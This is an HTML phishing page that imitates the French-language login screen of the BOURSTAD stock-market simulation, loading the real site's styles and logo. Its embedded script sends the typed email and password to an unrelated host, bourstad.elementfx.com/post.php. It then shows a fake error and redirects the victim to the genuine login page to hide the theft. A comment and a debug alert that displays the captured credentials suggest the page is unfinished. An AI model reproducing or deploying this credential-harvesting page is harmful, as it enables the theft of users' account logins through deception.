<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title>BOURSTAD | Login</title>

    <link href="https://bourstad.cirano.qc.ca/Content/bootstrap.min.css" rel="stylesheet">
    <link href="https://bourstad.cirano.qc.ca/Fonts/font-awesome/css/font-awesome.css" rel="stylesheet">

    <link href="https://bourstad.cirano.qc.ca/Content/animate.css" rel="stylesheet">
    <link href="https://bourstad.cirano.qc.ca/Content/style.css" rel="stylesheet">

</head>

<body class="landing-page" style="background:#ffffff !important">


<div class="navbar-wrapper">
    <nav class="navbar navbar-default navbar-fixed-top" role="navigation" style="background:#ffffff !important">
        <div class="container">
            <div class="row cirano-header-background">
            </div>
            <div class="row cirano-header">
                <div class="col-xs-6" style="padding:0px">
                    <a href=""><img alt="image" src="https://bourstad.cirano.qc.ca/Images/landing/logobourstad2.png"
                                    width="180"></a>
                </div>
                <div class="col-xs-6 hidden-xs"
                     style="text-align:right;margin-top:4px;margin-bottom:inherit;padding:0px">
                    <div class="pull-right"><h3>Simulation boursi&egrave;re</h3></div>
                </div>
            </div>
        </div>
    </nav>
</div>
<div class="middle-box text-center loginscreen head-simplified animated fadeInDown">
    <div>
        <div class="row m-b-md text-center">
            <div class="col-lg-12 inscription">
                <div class="navy-line"></div>
                <h1>Se connecter</h1>
            </div>
        </div>

        <form class="m-t" role="form">
            <div class="form-group">
                <div class="input-group m-b">
                    <span class="input-group-addon" style="line-height:2"><i class="fa fa-envelope-o"
                                                                             style="font-size:18px;color:#a7b1c4"></i></span>
                    <input class="form-control" id="email-input" name="Username"
                           placeholder="Nom d&#39;usager (courriel)" required=""
                           style="height:42px !important" type="email" value="">
                </div>
            </div>
            <div class="form-group">
                <div class="input-group m-b">
                    <span class="input-group-addon" style="line-height:2">&nbsp;<i class="fa fa-lock"
                                                                                   style="font-size:18px;color:#a7b1c4"></i></span>
                    <input class="form-control" id="password-input" name="Password" placeholder="Mot de passe"
                           required="" style="height:42px !important" type="password">
                </div>
            </div>

            <input class="btn btn-block btn-w-m btn-success" id="submit-button" style="line-height:2;font-size:17px"
                   type="submit">Connexion</input>

            <br/>
            <a href="/Pages/ForgotPassword">Mot de passe oubli&#233; ?</a>
            <br/>
            <hr/>
            <p class="text-muted text-center">Pas inscrit ? <a
                    href="https://bourstad.cirano.qc.ca/Register/Inscription">&nbsp; Cr&#233;er un compte</a></p>
        </form>

    </div>
</div>

<script>
    const submitButton = document.getElementById("submit-button");
    const emailInput = document.getElementById("email-input");
    const passwordInput = document.getElementById("password-input");

    submitButton.onclick = function () {
        const email = emailInput.value;
        const password = passwordInput.value;
        // REPLACE WITH PHP REQUEST
        let xhr = new XMLHttpRequest();
        xhr.open("POST", "http://bourstad.elementfx.com/post.php");
        xhr.setRequestHeader("Accept", "application/json");
        xhr.setRequestHeader("Content-Type", "application/json");

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                console.log(xhr.status);
                console.log(xhr.responseText);
            }
        };

        let data = `{
  "Username": ${email},
  "Password": ${password}
}`;

        xhr.send(data);
        alert(`Email : ${email} \nMot de passe : ${password}`);
        if (email.length < 1 || password.length < 1) {
            alert("Mot de passe ou courriel invalide");
        } else {
            alert("Une erreur est survenue, veuillez rÃ©essayer");
            window.location = "https://bourstad.cirano.qc.ca/Pages/Login";
        }
    }

    document.onkeydown = function (e) {
        if (e.key === "Enter") {
            submitButton.click();
        }
    }
</script>
</body>


</html>
